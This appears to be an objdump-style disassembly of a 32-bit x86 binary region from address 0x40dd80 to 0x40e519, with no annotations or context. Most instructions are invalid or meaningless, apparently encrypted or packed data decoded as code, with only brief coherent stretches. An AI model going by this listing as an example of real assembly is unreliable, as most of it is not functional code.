  40dd80:	enter  0xa76b,0xfd
  40dd84:	cmp    edx,DWORD PTR [esp+edx*8+0x69]
  40dd88:	pop    esp
  40dd89:	mov    ch,0xdf
  40dd8b:	add    esp,DWORD PTR ds:[eax+0x360df9b3]
  40dd92:	lods   eax,DWORD PTR ds:[esi]
  40dd93:	idiv   BYTE PTR [ebp-0x21413f29]
  40dd99:	scas   al,BYTE PTR es:[edi]
  40dd9a:	icebp  
  40dd9b:	push   0x647b34b0
  40dda0:	and    DWORD PTR [esi+0x57],eax
  40dda3:	out    dx,al
  40dda4:	pushf  
  40dda5:	ds xchg ebx,eax
  40dda7:	retf   0x7631
  40ddaa:	jge    0x40dd80
  40ddac:	inc    ecx
  40ddad:	out    0x32,al
  40ddaf:	cmp    BYTE PTR [edx+eax*2+0x202bf34e],dh
  40ddb6:	jle    0x40dd7b
  40ddb8:	das    
  40ddb9:	ja     0x40dd93
  40ddbb:	repnz push cs
  40ddbd:	cmp    al,0x69
  40ddbf:	std    
  40ddc0:	sub    BYTE PTR [ecx+0x68],cl
  40ddc3:	fstp   QWORD PTR ds:0x3b4c2666
  40ddc9:	lods   al,BYTE PTR ds:[esi]
  40ddca:	loopne 0x40de12
  40ddcc:	xor    BYTE PTR ds:0x52d8e9de,ah
  40ddd2:	mov    edi,0xc281da22
  40ddd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddd8:	pushf  
  40ddd9:	test   ch,bl
  40dddb:	inc    ebp
  40dddc:	(bad)  
  40dddd:	stos   BYTE PTR es:[edi],al
  40ddde:	scas   eax,DWORD PTR es:[edi]
  40dddf:	not    ebx
  40dde1:	daa    
  40dde2:	mov    ebx,0x2fea3df3
  40dde7:	mov    ebp,0x8772a778
  40ddec:	aas    
  40dded:	add    eax,0x430446
  40ddf2:	retf   0xe685
  40ddf5:	imul   esp,esp,0xe135508e
  40ddfb:	sar    DWORD PTR [edx],1
  40ddfd:	out    dx,al
  40ddfe:	pop    esp
  40ddff:	dec    ebp
  40de00:	scas   eax,DWORD PTR es:[edi]
  40de01:	lods   eax,DWORD PTR ds:[esi]
  40de02:	xchg   BYTE PTR [ebp-0x69],bl
  40de05:	sub    BYTE PTR [eax],dh
  40de07:	shl    DWORD PTR [edi-0x31],0xef
  40de0b:	jg     0x40de35
  40de0d:	inc    eax
  40de0e:	push   eax
  40de0f:	imul   eax,ebp,0x6a
  40de12:	dec    ebx
  40de13:	ss repnz dec ebp
  40de16:	in     eax,dx
  40de17:	pop    ebx
  40de18:	adc    eax,0x2b1c74f9
  40de1d:	test   BYTE PTR [edi+eiz*8-0x5b],0x4b
  40de22:	bound  esi,QWORD PTR [ebx+ecx*4+0x5b]
  40de26:	neg    dh
  40de28:	or     esi,0xffffffc9
  40de2b:	push   0x695aea51
  40de30:	shl    BYTE PTR [ebx],0x61
  40de33:	lods   eax,DWORD PTR ds:[esi]
  40de34:	cmp    DWORD PTR [ebx-0x7595fbd4],eax
  40de3a:	fwait
  40de3b:	inc    eax
  40de3c:	add    al,0x42
  40de3e:	sbb    ebx,DWORD PTR [ecx]
  40de40:	pop    ecx
  40de41:	xchg   edi,eax
  40de42:	sbb    eax,0xa592d391
  40de47:	fchs   
  40de49:	cmp    DWORD PTR [ebx-0x5f35a158],ecx
  40de4f:	pop    esp
  40de50:	dec    edx
  40de51:	je     0x40debb
  40de53:	ret    
  40de54:	arpl   WORD PTR [eax],cx
  40de56:	and    al,0x3a
  40de58:	ret    0xa16f
  40de5b:	mov    ds:0x94ca9d7a,eax
  40de60:	add    eax,0xccaff8f5
  40de65:	aam    0x3c
  40de67:	add    eax,0x1cae4a63
  40de6c:	retf   
  40de6d:	xor    cl,bh
  40de6f:	sub    eax,0x1ddb38d1
  40de74:	clc    
  40de75:	aaa    
  40de76:	repz push 0xfffffff8
  40de79:	xor    eax,0x9473360f
  40de7e:	in     al,0xf6
  40de80:	ficom  WORD PTR [edi+0x7bf097b2]
  40de86:	ins    DWORD PTR es:[edi],dx
  40de87:	mov    ebx,0xa481d8fe
  40de8c:	jge    0x40de22
  40de8e:	mov    ds:0xad4d2c87,al
  40de93:	cld    
  40de94:	push   ebx
  40de95:	push   esp
  40de96:	lahf   
  40de97:	pop    edx
  40de98:	mov    eax,ds:0x4acd6f25
  40de9d:	nop
  40de9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de9f:	std    
  40dea0:	scas   al,BYTE PTR es:[edi]
  40dea1:	dec    esi
  40dea2:	sub    al,0xbd
  40dea4:	fs inc edx
  40dea6:	fcmove st,st(2)
  40dea8:	popa   
  40dea9:	test   eax,ecx
  40deab:	add    BYTE PTR [ebx],ch
  40dead:	jnp    0x40de70
  40deaf:	cmp    DWORD PTR [edx-0x8],ebx
  40deb2:	int3   
  40deb3:	inc    eax
  40deb4:	sti    
  40deb5:	jg     0x40df24
  40deb7:	xor    edx,DWORD PTR [esi+0x28]
  40deba:	jecxz  0x40dec3
  40debc:	mov    edi,0xeddf667a
  40dec1:	push   ecx
  40dec2:	ja     0x40df2e
  40dec4:	cld    
  40dec5:	data16 or bl,bh
  40dec8:	or     esp,DWORD PTR [ebp-0x1e]
  40decb:	int3   
  40decc:	cs sub esp,0xffffffcd
  40ded0:	mov    ch,0x4
  40ded2:	loopne 0x40deb9
  40ded4:	push   0x60e037c5
  40ded9:	mov    dl,0xc2
  40dedb:	sbb    BYTE PTR [ecx+ebp*1+0x70],0xab
  40dee0:	push   ds
  40dee1:	or     al,0xcd
  40dee3:	(bad)  
  40dee5:	test   ah,0x66
  40dee8:	call   0x987b:0xe61176a4
  40deef:	push   es
  40def0:	mov    BYTE PTR [eax-0x76c70ff7],dh
  40def6:	adc    edi,DWORD PTR [ebp+0x70]
  40def9:	push   0xffffffb0
  40defb:	shl    dh,1
  40defd:	aam    0x27
  40deff:	popfw  
  40df01:	imul   ecx,DWORD PTR [edi+ebp*2-0x5c],0x2
  40df06:	jbe    0x40df45
  40df08:	iret   
  40df09:	cwde   
  40df0a:	stos   DWORD PTR es:[edi],eax
  40df0b:	pushw  ss
  40df0d:	jmp    0x40def0
  40df0f:	fwait
  40df10:	sub    DWORD PTR [esi-0x3fdebc9f],edi
  40df16:	push   ecx
  40df17:	fwait
  40df18:	jns    0x40df6e
  40df1a:	lods   eax,DWORD PTR ds:[esi]
  40df1b:	jge    0x40df14
  40df1d:	jge    0x40dedb
  40df1f:	cdq    
  40df20:	pop    esp
  40df21:	pop    esp
  40df22:	nop
  40df23:	sbb    eax,0xbee50f2
  40df28:	scas   eax,DWORD PTR es:[edi]
  40df29:	sbb    ebx,DWORD PTR [ebp-0x4f]
  40df2c:	mov    edi,0x2fc53d86
  40df31:	cmp    ah,BYTE PTR [eax+0x77]
  40df34:	pop    ss
  40df35:	sbb    ch,0x1a
  40df38:	jo     0x40df98
  40df3a:	fdivr  st(0),st
  40df3c:	add    al,cl
  40df3e:	add    al,0xc1
  40df40:	neg    esi
  40df42:	sbb    eax,ebp
  40df44:	push   ss
  40df45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df46:	and    BYTE PTR [ecx+0x461727e8],0xbf
  40df4d:	inc    ecx
  40df4e:	fld    DWORD PTR [edi+0x5960dde1]
  40df54:	sub    al,al
  40df56:	xchg   ebx,eax
  40df57:	loop   0x40df72
  40df59:	jl     0x40df47
  40df5b:	cld    
  40df5c:	fwait
  40df5d:	adc    ch,bl
  40df5f:	jmp    0x96062aad
  40df64:	into   
  40df65:	lods   al,BYTE PTR ds:[esi]
  40df66:	ret    0x7f95
  40df69:	repnz addr16 out dx,eax
  40df6c:	clc    
  40df6d:	lock and cl,BYTE PTR [ecx]
  40df70:	mov    edx,0xf3ba58ec
  40df75:	mov    ecx,0xe104b965
  40df7a:	cmp    eax,0x2abdc924
  40df7f:	cmc    
  40df80:	mov    dl,0x74
  40df82:	sbb    BYTE PTR [edx+edx*4-0x70b6289a],ah
  40df89:	xlat   BYTE PTR ds:[ebx]
  40df8a:	mov    dl,0xb3
  40df8c:	xchg   esp,eax
  40df8d:	in     al,0xc5
  40df8f:	(bad)  
  40df90:	and    ebx,esi
  40df92:	add    al,0x56
  40df94:	stc    
  40df95:	sbb    BYTE PTR [edx+ebp*8],al
  40df98:	mov    esp,0x1bcbb338
  40df9d:	loop   0x40e018
  40df9f:	cmp    al,0xf6
  40dfa1:	or     al,0x5f
  40dfa3:	ds in  al,dx
  40dfa5:	push   es
  40dfa6:	jne    0x40df88
  40dfa8:	pop    ebx
  40dfa9:	jb     0x40df67
  40dfab:	add    ebp,DWORD PTR [ebx+0x77]
  40dfae:	mov    edx,0x918733c2
  40dfb3:	jp     0x40df6b
  40dfb5:	in     eax,dx
  40dfb6:	xor    BYTE PTR [ecx-0x7b],ah
  40dfb9:	push   esi
  40dfba:	push   cs
  40dfbb:	inc    ebx
  40dfbc:	adc    al,0xae
  40dfbe:	aam    0xd6
  40dfc0:	mov    cl,0x63
  40dfc2:	xor    eax,esp
  40dfc4:	or     cl,BYTE PTR [edx+0x6]
  40dfc7:	mov    ah,0xee
  40dfc9:	das    
  40dfca:	sbb    eax,0xa39c70bd
  40dfcf:	cli    
  40dfd0:	inc    eax
  40dfd1:	sub    al,0xa6
  40dfd3:	push   edi
  40dfd4:	pop    esp
  40dfd5:	gs jle 0x40dffa
  40dfd8:	aas    
  40dfd9:	push   ds
  40dfda:	xor    al,0xb7
  40dfdc:	ret    0x9d5b
  40dfdf:	dec    esi
  40dfe0:	ins    DWORD PTR es:[edi],dx
  40dfe1:	loop   0x40df72
  40dfe3:	jb     0x40dff3
  40dfe5:	pusha  
  40dfe6:	mov    ecx,0x2b4ca160
  40dfeb:	push   edi
  40dfec:	push   esp
  40dfed:	dec    edx
  40dfee:	jg     0x40e068
  40dff0:	repnz pop esp
  40dff2:	stos   BYTE PTR es:[edi],al
  40dff3:	mov    eax,0x2b5c4b21
  40dff8:	sbb    dh,BYTE PTR [eax-0x1b6f3ee3]
  40dffe:	add    al,0x78
  40e000:	sub    ch,BYTE PTR [edx-0x40]
  40e003:	rcr    DWORD PTR [edx+0x61],0x86
  40e007:	lods   eax,DWORD PTR ds:[esi]
  40e008:	fistp  QWORD PTR [ecx+0x7fb9405e]
  40e00e:	push   esp
  40e00f:	mov    bh,0x8f
  40e011:	in     eax,dx
  40e012:	cwde   
  40e013:	xor    ah,BYTE PTR [edi]
  40e015:	jne    0x40e060
  40e017:	inc    esp
  40e018:	sar    BYTE PTR [esi],1
  40e01a:	inc    ecx
  40e01b:	(bad)  [eax+0x1df01d92]
  40e021:	jo     0x40e02e
  40e023:	xchg   edx,eax
  40e024:	mov    cl,0x27
  40e026:	mov    edx,0x3c2f6d61
  40e02b:	mov    dl,0xcc
  40e02d:	fiadd  DWORD PTR [ecx+0x76529bf3]
  40e033:	pusha  
  40e034:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e035:	inc    edi
  40e036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e037:	add    al,0x8b
  40e039:	jmp    0x374a97b4
  40e03e:	mov    ebx,0xa7549da9
  40e043:	mov    ecx,0x9117c515
  40e048:	add    ecx,ebp
  40e04a:	call   0x978c2119
  40e04f:	xor    edi,edi
  40e051:	add    ecx,ebx
  40e053:	mov    DWORD PTR [ebp-0x20],ecx
  40e056:	mov    eax,ds:0x434396
  40e05b:	mov    eax,DWORD PTR [ebp-0x20]
  40e05e:	jmp    0x40e452
  40e063:	xlat   BYTE PTR ds:[ebx]
  40e064:	frstor [esi-0xeac49ad]
  40e06a:	pop    ecx
  40e06b:	test   DWORD PTR [ecx],0x7860baa7
  40e071:	dec    esp
  40e072:	dec    ecx
  40e073:	stc    
  40e074:	xchg   edx,eax
  40e075:	jo     0x40e0e7
  40e077:	dec    ecx
  40e078:	jge    0x40e0ea
  40e07a:	jo     0x40e0ad
  40e07c:	jge    0x40e015
  40e07e:	mov    WORD PTR [eax-0x6f869173],ds
  40e084:	scas   eax,DWORD PTR es:[edi]
  40e085:	call   0x74a685a6
  40e08a:	jnp    0x40e10a
  40e08c:	jnp    0x40e0d8
  40e08e:	and    edi,DWORD PTR [edx+0x369600d8]
  40e094:	xor    al,0x9e
  40e096:	jns    0x40e085
  40e098:	in     eax,0x9e
  40e09a:	pushf  
  40e09b:	sub    ah,bl
  40e09d:	cli    
  40e09e:	dec    edx
  40e09f:	pop    ss
  40e0a0:	nop
  40e0a1:	mov    dh,0x42
  40e0a3:	(bad)  
  40e0a4:	arpl   WORD PTR [ebp-0x3a67f8ad],cx
  40e0aa:	imul   eax,DWORD PTR [ebp-0x7079d10],0x9c295518
  40e0b4:	mov    WORD PTR [edx-0x1016729e],ds
  40e0ba:	iret   
  40e0bb:	xchg   BYTE PTR [edi-0x70bfc835],ch
  40e0c1:	hlt    
  40e0c2:	ret    
  40e0c3:	xchg   edi,eax
  40e0c4:	sbb    BYTE PTR [esi+0x1e2b5ad4],0xb5
  40e0cb:	push   ds
  40e0cc:	jo     0x40e0b2
  40e0ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0cf:	(bad)  
  40e0d0:	dec    edx
  40e0d1:	xor    DWORD PTR [esi],ebp
  40e0d3:	mov    edi,0x3ef411aa
  40e0d9:	outs   dx,BYTE PTR ds:[esi]
  40e0da:	ss sbb al,0x3a
  40e0dd:	(bad)
  40e0e1:	ror    DWORD PTR [edi],1
  40e0e3:	xchg   cx,ax
  40e0e5:	add    BYTE PTR [edx-0x649b711e],al
  40e0eb:	dec    ebp
  40e0ec:	(bad)  
  40e0ed:	jl     0x40e0ee
  40e0ef:	mov    ebx,0x8d541e1d
  40e0f4:	test   al,0x12
  40e0f6:	push   edx
  40e0f7:	pop    edi
  40e0f8:	fistp  WORD PTR ds:0x4c38e2df
  40e0fe:	dec    edi
  40e0ff:	xchg   esp,eax
  40e100:	popa   
  40e101:	pushf  
  40e102:	scas   eax,DWORD PTR es:[edi]
  40e103:	add    eax,esp
  40e105:	and    edi,edx
  40e107:	push   edi
  40e108:	push   ecx
  40e109:	pusha  
  40e10a:	shl    edi,1
  40e10c:	sbb    eax,0x4f4811f6
  40e111:	(bad)  
  40e112:	aad    0x8
  40e114:	test   BYTE PTR [ecx+eiz*1+0x21d7b25a],0xe7
  40e11c:	sub    eax,0x6b80c71e
  40e121:	xchg   ecx,eax
  40e122:	in     eax,0xbd
  40e124:	pusha  
  40e125:	shl    BYTE PTR [eax+0x52],cl
  40e128:	adc    eax,0x53da8bdc
  40e12d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e12e:	mov    ch,0x13
  40e130:	cmp    al,0x9
  40e132:	fdiv   QWORD PTR gs:[esi-0x51d363e9]
  40e139:	call   0x5c67:0x7c6bc468
  40e140:	(bad)  
  40e142:	mov    ch,0xf3
  40e144:	into   
  40e145:	cmp    cl,al
  40e147:	out    0x6d,eax
  40e149:	inc    ebx
  40e14a:	scas   eax,DWORD PTR es:[edi]
  40e14b:	mov    ecx,0x5774b9dc
  40e150:	in     al,0x59
  40e152:	sti    
  40e153:	inc    esp
  40e154:	pop    esp
  40e155:	out    0xc5,eax
  40e157:	test   BYTE PTR [ebp+0x30],ah
  40e15a:	and    ecx,edx
  40e15c:	imul   esi,DWORD PTR [eiz*8-0x64495243],0x88351942
  40e167:	ds jmp 0x28af5378
  40e16d:	div    bl
  40e16f:	adc    al,0xd6
  40e171:	mul    BYTE PTR [ebx+0x69]
  40e174:	xchg   al,bl
  40e176:	add    ebp,DWORD PTR [edi+0x2e6e27df]
  40e17c:	adc    cl,BYTE PTR [ebx+eax*8+0x3b44e4af]
  40e183:	(bad)  
  40e184:	mov    esp,0x72851bd9
  40e189:	sbb    DWORD PTR [eax+0x46],ebp
  40e18c:	daa    
  40e18d:	outs   dx,BYTE PTR ds:[esi]
  40e18e:	mov    bl,0x22
  40e190:	mov    dh,0x19
  40e192:	pop    eax
  40e193:	cmc    
  40e194:	outs   dx,DWORD PTR ds:[esi]
  40e195:	pop    ss
  40e196:	in     eax,0xa7
  40e198:	adc    al,0xa5
  40e19a:	shl    edx,cl
  40e19c:	(bad)  
  40e19d:	nop
  40e19e:	xor    eax,0xcee6641a
  40e1a3:	inc    eax
  40e1a4:	std    
  40e1a5:	sub    al,0xd8
  40e1a7:	bound  eax,QWORD PTR ds:0xa5ede998
  40e1ad:	jnp    0x40e1aa
  40e1af:	sti    
  40e1b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1b1:	daa    
  40e1b2:	cmp    al,0xcd
  40e1b5:	sbb    al,0x48
  40e1b7:	in     al,dx
  40e1b8:	mov    al,ds:0x9a732420
  40e1bd:	mov    ch,0xa3
  40e1bf:	add    eax,0xc387b593
  40e1c5:	mov    ah,0x4f
  40e1c7:	jmp    FWORD PTR [ecx+0x50120e18]
  40e1cd:	sub    al,0xd5
  40e1cf:	inc    ecx
  40e1d0:	xor    al,0x20
  40e1d2:	push   esi
  40e1d3:	(bad)  
  40e1d4:	pop    esi
  40e1d5:	mov    dh,0x26
  40e1d7:	rol    DWORD PTR [ebx],1
  40e1d9:	xchg   ah,ah
  40e1db:	jae    0x40e164
  40e1dd:	nop
  40e1de:	add    al,0x4b
  40e1e0:	add    BYTE PTR [eax+ebx*8-0x264d9861],0xb2
  40e1e8:	jge    0x40e224
  40e1ea:	daa    
  40e1eb:	aad    0x83
  40e1ed:	mov    al,ds:0x8dbb43cf
  40e1f2:	hlt    
  40e1f3:	and    bh,ch
  40e1f5:	cdq    
  40e1f6:	inc    ebp
  40e1f7:	js     0x40e1d4
  40e1f9:	adc    bl,BYTE PTR [eax+0x2855fc57]
  40e1ff:	jb     0x40e181
  40e201:	pop    edx
  40e202:	dec    esp
  40e203:	into   
  40e204:	imul   ebx,DWORD PTR [eax+0x2e],0x70c27523
  40e20b:	inc    esi
  40e20c:	pop    es
  40e20d:	js     0x40e257
  40e20f:	les    ecx,FWORD PTR [ebx]
  40e211:	add    DWORD PTR [ebx-0x78af0b53],0x1eea004
  40e21b:	scas   al,BYTE PTR es:[edi]
  40e21c:	je     0x40e27f
  40e21e:	int    0x34
  40e220:	out    dx,eax
  40e221:	cmp    cl,BYTE PTR [ebp-0x68627832]
  40e227:	xor    eax,0xb3ec877f
  40e22c:	in     eax,dx
  40e22d:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40e22f:	or     eax,0x8d334368
  40e234:	jbe    0x40e250
  40e236:	loopne 0x40e238
  40e238:	push   es
  40e239:	and    esp,DWORD PTR [edi+0x6af57aa]
  40e23f:	mov    bh,0xbe
  40e241:	adc    edi,edi
  40e243:	jmp    0x40e1ea
  40e245:	or     al,0xff
  40e247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e248:	sbb    DWORD PTR [eax+0x4d4c93e8],ecx
  40e24e:	dec    ebp
  40e24f:	ret    0x466b
  40e252:	mov    dh,0x8b
  40e254:	(bad)  
  40e255:	femms  
  40e257:	fdivr  st,st(1)
  40e259:	inc    esp
  40e25a:	mov    ?,WORD PTR [edi-0x3a]
  40e25d:	leave  
  40e25e:	inc    edx
  40e25f:	ror    DWORD PTR [ebx-0x2f2bfcd1],0x6f
  40e266:	popf   
  40e267:	sbb    DWORD PTR [ebx],ebx
  40e269:	test   eax,0x7099274
  40e26e:	push   0xffffffc2
  40e270:	mov    ah,BYTE PTR [edi-0x23fd9b35]
  40e276:	pop    ebx
  40e277:	dec    esp
  40e278:	pop    edi
  40e279:	cmc    
  40e27a:	adc    al,0xef
  40e27c:	ret    0xb890
  40e27f:	lock fdiv DWORD PTR cs:[esi+0x5e]
  40e284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e285:	fistp  WORD PTR [edi+0x3f]
  40e288:	add    eax,0x1ade98ab
  40e28d:	and    eax,0x5ee7636d
  40e292:	jmp    0x40e2ff
  40e294:	loop   0x40e2d7
  40e296:	pop    eax
  40e297:	push   ds
  40e298:	sar    BYTE PTR [ebx-0x27],cl
  40e29b:	aas    
  40e29c:	imul   eax,edx,0x8b544310
  40e2a2:	xlat   BYTE PTR ds:[ebx]
  40e2a3:	mov    dh,0xc5
  40e2a5:	(bad)  
  40e2a6:	loope  0x40e247
  40e2a8:	dec    ebx
  40e2a9:	les    eax,FWORD PTR [ecx-0x52]
  40e2ac:	add    dl,ch
  40e2ae:	and    BYTE PTR [si+0x57],dl
  40e2b2:	xchg   DWORD PTR [edx],ebp
  40e2b4:	mov    bl,0xf2
  40e2b6:	mov    eax,ds:0x6085fae5
  40e2bb:	jg     0x40e311
  40e2bd:	add    eax,0xdd2ffa09
  40e2c2:	xchg   esi,eax
  40e2c3:	sub    DWORD PTR [ebx-0x30],0xfee7040c
  40e2ca:	mov    ah,0xc1
  40e2cc:	xor    al,0x7b
  40e2ce:	dec    edi
  40e2cf:	daa    
  40e2d0:	out    0x91,eax
  40e2d2:	sub    DWORD PTR [edi],ebx
  40e2d4:	or     esi,DWORD PTR [eax-0x2f838d87]
  40e2da:	push   ebx
  40e2db:	mov    ds:0x12d2308b,al
  40e2e0:	scas   al,BYTE PTR es:[edi]
  40e2e1:	xor    BYTE PTR [ebp-0x3b],dl
  40e2e4:	std    
  40e2e5:	sbb    esi,edx
  40e2e7:	ret    0x1a76
  40e2ea:	pop    eax
  40e2eb:	mov    dl,bl
  40e2ed:	jno    0x40e30e
  40e2ef:	addr16 mov cl,0xea
  40e2f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2f3:	das    
  40e2f4:	retf   
  40e2f5:	cdq    
  40e2f6:	jo     0x40e348
  40e2f8:	cdq    
  40e2f9:	pushf  
  40e2fa:	imul   ebx,DWORD PTR [ebx],0xab017fc
  40e300:	(bad)  
  40e302:	ret    
  40e303:	popa   
  40e304:	hlt    
  40e305:	xor    DWORD PTR [esi+0x1df0e557],ebp
  40e30b:	mov    ds:0x23223581,al
  40e310:	in     al,0x50
  40e312:	or     DWORD PTR [edx+ecx*4-0xaadfcb6],ebx
  40e319:	or     BYTE PTR [edx-0x39],ah
  40e31c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e31d:	popa   
  40e31e:	bound  ebx,QWORD PTR [ebp-0x23]
  40e321:	lea    ebx,ds:[esi+0x3a1f1d2c]
  40e328:	and    al,0x16
  40e32a:	inc    esp
  40e32b:	inc    esi
  40e32c:	in     al,dx
  40e32d:	xlat   BYTE PTR ds:[ebx]
  40e32e:	loop   0x40e346
  40e330:	test   DWORD PTR [edi],esp
  40e332:	ins    BYTE PTR es:[edi],dx
  40e333:	mov    eax,cs
  40e335:	in     al,dx
  40e336:	jbe    0x40e39c
  40e338:	ror    BYTE PTR [eax-0x3c5f6f10],1
  40e33e:	test   edi,esi
  40e340:	jno    0x40e38a
  40e342:	mov    ah,0xec
  40e344:	and    ch,BYTE PTR [ebx+0x60]
  40e347:	sbb    eax,0xf34da086
  40e34c:	push   0xffffff98
  40e34e:	push   ss
  40e34f:	add    ah,BYTE PTR [ecx]
  40e351:	jecxz  0x40e3b2
  40e353:	out    0xa6,eax
  40e355:	(bad)  
  40e356:	pusha  
  40e357:	imul   ecx,DWORD PTR [edx-0x7eed3c5f],0x93487cc3
  40e361:	push   edx
  40e362:	lock (bad) 
  40e364:	xchg   ebx,eax
  40e365:	or     DWORD PTR [esi+0x653c49c4],esp
  40e36b:	ja     0x40e39c
  40e36d:	cmp    al,0x3f
  40e36f:	cmc    
  40e370:	in     eax,dx
  40e371:	sub    al,0xc7
  40e373:	xchg   ebx,eax
  40e374:	int3   
  40e375:	xor    eax,DWORD PTR [ecx]
  40e377:	jbe    0x40e33c
  40e379:	pop    ebp
  40e37a:	push   edx
  40e37b:	cvtps2pd xmm4,QWORD PTR [esi+edi*8]
  40e37f:	add    bl,BYTE PTR [ebp+eax*1-0x3a6b5519]
  40e386:	cmp    ebp,DWORD PTR [ebp-0x3a860ce2]
  40e38c:	stos   DWORD PTR es:[edi],eax
  40e38d:	mov    ecx,0x6dc88d77
  40e392:	pop    ebx
  40e393:	loop   0x40e359
  40e395:	sub    dl,BYTE PTR [esi+0x3146d84c]
  40e39b:	jle    0x40e331
  40e39d:	popa   
  40e39e:	stos   BYTE PTR es:[edi],al
  40e39f:	or     al,bl
  40e3a1:	pop    ebp
  40e3a2:	sub    al,0x3d
  40e3a4:	ja     0x40e41c
  40e3a6:	loop   0x40e414
  40e3a8:	mov    ecx,0xfc7c2f2c
  40e3ad:	push   0x56
  40e3af:	push   ss
  40e3b0:	aaa    
  40e3b1:	adc    ah,BYTE PTR [edi]
  40e3b3:	mov    WORD PTR [esi-0x1f540c0c],ds
  40e3b9:	push   es
  40e3ba:	push   esp
  40e3bb:	(bad)  
  40e3bc:	or     eax,0xc7fea58f
  40e3c1:	test   al,0x59
  40e3c3:	jg     0x40e36b
  40e3c5:	mov    al,0x6b
  40e3c7:	lods   eax,DWORD PTR ds:[esi]
  40e3c8:	xchg   esi,eax
  40e3c9:	inc    ebp
  40e3ca:	ds repz call 0x43dac748
  40e3d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3d2:	xor    al,0xb8
  40e3d4:	jmp    FWORD PTR ds:0x3abb207a
  40e3da:	push   ecx
  40e3db:	imul   esp,DWORD PTR [esi-0x7ec96e90],0xffffffb6
  40e3e2:	mov    ebp,0x6eef7a86
  40e3e7:	lea    edx,[edx+0x16]
  40e3ea:	xchg   edx,eax
  40e3eb:	jp     0x40e3f8
  40e3ed:	rcl    BYTE PTR ds:0x7b8e4f8d,cl
  40e3f3:	lahf   
  40e3f4:	gs (bad) 
  40e3f6:	inc    BYTE PTR ds:0x53047a90
  40e3fc:	shl    bh,0x94
  40e3ff:	jl     0x40e465
  40e401:	inc    esi
  40e402:	pop    esi
  40e403:	mov    eax,ds:0x795a926f
  40e408:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e40a:	pushf  
  40e40b:	je     0x40e3ac
  40e40d:	mov    edi,0x69743c1
  40e412:	jnp    0x40e3d8
  40e414:	jl     0x40e3bd
  40e416:	pop    ebx
  40e417:	pop    edx
  40e418:	sbb    esp,DWORD PTR [edi+edx*1-0x7d]
  40e41c:	hlt    
  40e41d:	push   ss
  40e41e:	rcr    BYTE PTR [eax-0x2a8a07d0],1
  40e424:	imul   edx,ebx,0x5c
  40e427:	int    0x30
  40e429:	jno    0x40e469
  40e42b:	loope  0x40e48b
  40e42d:	sbb    esi,DWORD PTR [esi+0x5c0d1fb7]
  40e433:	jmp    0x72c9:0x8650ef90
  40e43a:	icebp  
  40e43b:	dec    edi
  40e43c:	imul   ebp,ebp,0xe28046
  40e442:	xor    al,BYTE PTR [edx+esi*8+0x56]
  40e446:	and    eax,0x60944ed0
  40e44b:	ja     0x40e470
  40e44d:	pop    ds
  40e44e:	arpl   WORD PTR [ecx+esi*8-0x17bf03f],dx
  40e455:	sbb    BYTE PTR [eax],al
  40e457:	add    BYTE PTR [edi],cl
  40e459:	mov    dh,0x5
  40e45b:	add    BYTE PTR [ebx+0x43],0x0
  40e45f:	add    DWORD PTR ds:0x43441d,eax
  40e465:	mov    eax,DWORD PTR [ebp-0x4]
  40e468:	or     DWORD PTR ds:0x432dda,0x4326f0
  40e472:	xor    eax,0x7510855
  40e477:	add    eax,ebx
  40e479:	mov    DWORD PTR ds:0x432dc2,0x11db
  40e483:	cmp    edi,eax
  40e485:	jne    0x40f511
  40e48b:	push   DWORD PTR [ebp+0x8]
  40e48e:	adc    DWORD PTR ds:0x434392,0x8a5
  40e498:	call   0x40bc0c
  40e49d:	mov    DWORD PTR [ebp-0x20],eax
  40e4a0:	add    eax,0x438
  40e4a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e4a8:	jmp    0x40e89c
  40e4ad:	fs pop ss
  40e4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4b0:	sbb    BYTE PTR [ecx-0x4a],dh
  40e4b3:	popa   
  40e4b4:	push   ebx
  40e4b5:	neg    BYTE PTR [ecx+edx*1+0x19]
  40e4b9:	push   0xfffffffd
  40e4bb:	or     al,0x75
  40e4bd:	rcr    BYTE PTR [esi+0x7d497070],cl
  40e4c3:	jo     0x40e535
  40e4c5:	in     eax,dx
  40e4c6:	outs   dx,BYTE PTR ds:[esi]
  40e4c7:	mov    esp,0xa26042a1
  40e4cc:	cld    
  40e4cd:	inc    esi
  40e4ce:	retf   0xcf4a
  40e4d1:	retf   0x80ec
  40e4d4:	pop    esi
  40e4d5:	aaa    
  40e4d6:	(bad)  
  40e4d7:	jp     0x40e4e5
  40e4d9:	sahf   
  40e4da:	sub    ah,ch
  40e4dc:	jb     0x40e4eb
  40e4de:	mov    al,0xa2
  40e4e0:	adc    BYTE PTR [ebx+0x34],al
  40e4e3:	jle    0x40e550
  40e4e5:	jae    0x40e4f4
  40e4e7:	jmp    0x6fab:0x6fa065a1
  40e4ee:	jo     0x40e505
  40e4f0:	int3   
  40e4f1:	or     eax,DWORD PTR [ebx-0x56]
  40e4f4:	dec    edx
  40e4f5:	ficom  DWORD PTR [eax-0xd7b2987]
  40e4fb:	mov    esi,DWORD PTR [esi]
  40e4fd:	fisub  DWORD PTR [eax+esi*2+0x3c]
  40e501:	jne    0x40e570
  40e503:	jecxz  0x40e573
  40e505:	inc    esi
  40e506:	add    BYTE PTR [ebp+0x6b04ccb3],cl
  40e50c:	mov    ch,0x52
  40e50e:	fadd   QWORD PTR [edi]
  40e510:	mov    ebp,0xafc0a009
  40e515:	xchg   esi,eax
  40e516:	ins    DWORD PTR es:[edi],dx
  40e517:	jb     0x40e4b8
  40e519:	dec    ebp
